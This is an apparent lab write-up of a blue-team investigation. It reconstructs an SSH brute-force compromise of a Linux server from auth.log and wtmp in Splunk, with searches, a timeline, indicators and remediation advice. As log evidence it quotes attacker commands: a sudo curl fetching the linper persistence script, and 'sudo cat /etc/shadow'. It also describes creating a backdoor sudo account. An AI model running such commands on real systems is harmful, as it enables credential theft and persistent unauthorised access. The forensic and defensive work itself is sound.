# Brutus — SSH Brute-Force & Root Compromise

Investigated a brute-force attack against an internet-facing Confluence server by analyzing Linux authentication artifacts (`auth.log` and `wtmp`) in Splunk. Reconstructed the full intrusion: credential brute-force, successful root login, backdoor account creation for persistence, and a post-exploitation script download.

**Technique:** SSH Brute Force (T1110) → Create Account: Local Account (T1136.001)

---

## Tools Used

| Tool | What it did here |
|------|------------------|
| **7-Zip** | Extracted the AES-encrypted archive (`Brutus.zip`, password `hacktheblue`). Windows' built-in zip can't handle AES — it fails with error `0x80004005`. |
| **Splunk** | SIEM. Ingested `auth.log` via **Add Data → Upload**, sourcetype **`linux_secure`**. All timeline analysis done with SPL. |
| **rex (SPL)** | `linux_secure` doesn't auto-extract fields, so `src_ip` and `user` were pulled at search time with `rex`. |
| **utmp.py** | Parsed the `wtmp` binary into readable login/logout records to recover the true terminal-session login time. |

### Tool → Step Map

```
7-Zip                      -> extract auth.log, wtmp, utmp.py
Splunk Upload (linux_secure) -> ingest auth.log
rex / Field Extractor      -> src_ip, user fields
SPL searches               -> brute-force source, accepted login, session IDs, useradd, sudo command
utmp.py wtmp               -> manual terminal login timestamp
```

---

## 1. Ingesting the Log (Splunk)

Uploaded `auth.log` into Splunk as sourcetype `linux_secure` — 385 events, fields parsing cleanly. Directory Monitor failed with "Path is not readable" (Splunk's service account can't read a user profile's Downloads), so **Add Data → Upload** is the right input for a single static artifact.

<img width="1901" height="906" alt="01-splunk-ingest-385-events-linux_secure" src="https://github.com/user-attachments/assets/7f9d83f8-fe02-4f39-b6d9-5894cc4f0f1b" />


## 2. Identifying the Brute Force (Task 1)

`linux_secure` doesn't extract the source IP, so pulled it at search time and counted hits per IP:

```spl
source="auth.log" "Failed password"
| rex "from (?<src_ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
| stats count by src_ip | sort -count
```

A single IP is responsible for every failed-password attempt — the brute-forcer, hitting `root`, `backup`, and invalid users (`admin`, `svc_account`, `server_adm`):

- **Source IP:** `65.2.161.68`

<img width="1887" height="904" alt="03-failed-passwords-root-backup" src="screenshots/03-failed-passwords-root-backup.png" />

<img width="1907" height="890" alt="02-task1-bruteforce-src_ip" src="screenshots/02-task1-bruteforce-src_ip-65.2.161.68.png" />

## 3. The Successful Login & the Right Session (Tasks 2 & 4)

Filtered for successful authentications from the attacker IP:

```spl
source="auth.log" "Accepted password"
```

There are **two** `Accepted password for root` events — and they are not equal:

- `06:31:40` port 34782 → **session 34** — opens and logs out in the *same second*. This is the brute-force tool confirming the cracked credential.
- `06:32:44` port 53184 → **session 37** — an interactive login that persists ~5 minutes and performs all the hands-on activity.

The session number comes from `systemd-logind`, not `sshd` (sshd authenticates; logind assigns the session):

```spl
source="auth.log" "New session" user=root
```

- **Compromised account:** `root`
- **Attacker's interactive session:** `37`

<img width="1711" height="803" alt="05-accepted-root-session37-context" src="screenshots/05-accepted-root-session37-context.png" />

<img width="1913" height="921" alt="08-new-session-list-6-34-37-49" src="screenshots/08-new-session-list-6-34-37-49.png" />

> Session **6** (06:19:54) predates the brute force entirely and is a legitimate earlier login — not the attacker. Session **34** is the tool's throwaway hit. Only **37** is the human.

## 4. Manual Login Time from wtmp (Task 3)

The SSH authentication time and the terminal-session establishment time differ. `auth.log` shows `Accepted password` at `06:32:44`; the `wtmp` record for the established pts session is one second later. Parsed `wtmp` to confirm:

```bash
python3 utmp.py wtmp
```

- **Manual terminal login (UTC):** `2024-03-06 06:32:45`

## 5. Persistence — Backdoor Account (Tasks 5 & 6)

Searched for account creation:

```spl
source="auth.log" "new user" OR "useradd"
```

At `06:34:18` the attacker created a local account and gave it elevated rights:

- `useradd[2592]: new user: name=cyberjunkie, UID=1002 ... shell=/bin/bash`
- `06:35:15` — `cyberjunkie` added to the **sudo** group

- **New account:** `cyberjunkie`
- **MITRE sub-technique:** `T1136.001` — Create Account: Local Account

<img width="1904" height="775" alt="10-task5-useradd-cyberjunkie" src="screenshots/10-task5-useradd-cyberjunkie.png" />

## 6. Session End & Account Switch (Task 7)

The attacker closed the brute-forced root session and returned through the backdoor account they'd just built:

- `06:37:24` — `Removed session 37` / `Session 37 logged out` (root session ends)
- `06:37:34` — `Accepted password for cyberjunkie ... port 43260` (new SSH login, session 49)

- **First SSH session end (UTC):** `2024-03-06 06:37:24`

<img width="1908" height="937" alt="09-task7-session37-open-close" src="screenshots/09-task7-session37-open-close.png" />

## 7. Privilege Abuse — Script Download (Task 8)

Logged in as `cyberjunkie`, the attacker used their sudo rights to escalate back to root and pull a persistence tool:

```spl
source="auth.log" cyberjunkie sudo COMMAND
```

At `06:39:38`:
```
sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

- **Full sudo command:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

`linper` is a Linux persistence automation tool. The attacker also ran `sudo cat /etc/shadow` at 06:37:57 to dump password hashes.

<img width="1910" height="914" alt="11-task8-cyberjunkie-sudo-curl-linper" src="screenshots/11-task8-cyberjunkie-sudo-curl-linper.png" />

---

## Reconstructed Attack Timeline

| Time (2024-03-06, UTC) | Action | Artifact |
|---|---|---|
| ~06:31 | SSH brute force from `65.2.161.68` (root, backup, invalid users) | auth.log |
| 06:31:40 | First successful root login — automated tool (session 34, closes instantly) | auth.log |
| 06:32:44 | Interactive root login (session 37, port 53184) | auth.log |
| 06:32:45 | Terminal session established | wtmp |
| 06:34:18 | Backdoor account `cyberjunkie` created (UID 1002) | auth.log |
| 06:35:15 | `cyberjunkie` added to `sudo` group | auth.log |
| 06:37:24 | Root session 37 closed | auth.log |
| 06:37:34 | Attacker logs back in as `cyberjunkie` (session 49) | auth.log |
| 06:37:57 | `sudo cat /etc/shadow` (hash dump) | auth.log |
| 06:39:38 | `sudo curl .../linper.sh` (persistence tool download) | auth.log |

## Indicators (IOCs)

- Host: `LAFRANCE` (`ip-172-31-35-28`)
- Attacker IP: `65.2.161.68`
- Compromised account: `root`
- Backdoor account: `cyberjunkie` (UID 1002, member of `sudo`)
- Downloaded tool: `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Recommendations

- **Reset** the `root` password and disable direct root SSH (`PermitRootLogin no`); assume `/etc/shadow` was exfiltrated and rotate all local credentials.
- **Remove** the `cyberjunkie` account, and audit `/etc/passwd`, the `sudo` group, and `/etc/sudoers` for any other attacker-added entries.
- **Enforce** key-based authentication and add rate-limiting (e.g. `fail2ban`) to blunt brute-force attempts.
- **Hunt** for `linper.sh` and the persistence it installs (cron, systemd units, SSH keys, new users) on this and neighbouring hosts.
- **Alert** on `useradd`/`usermod --groups sudo`, and on successful root SSH logins from external IPs.

---

## Conclusion

Linux authentication artifacts fully reconstruct the intrusion: a single external IP (`65.2.161.68`) brute-forced SSH, cracked `root`, and established an interactive session. The attacker then created a privileged backdoor account (`cyberjunkie`), switched to it, dumped `/etc/shadow`, and downloaded the `linper` persistence tool via sudo.

**Assessment:** Confirmed root compromise via SSH brute force (T1110) with established persistence (T1136.001). The downloaded `linper` script indicates intent to maintain long-term access — the host should be treated as fully compromised and rebuilt.
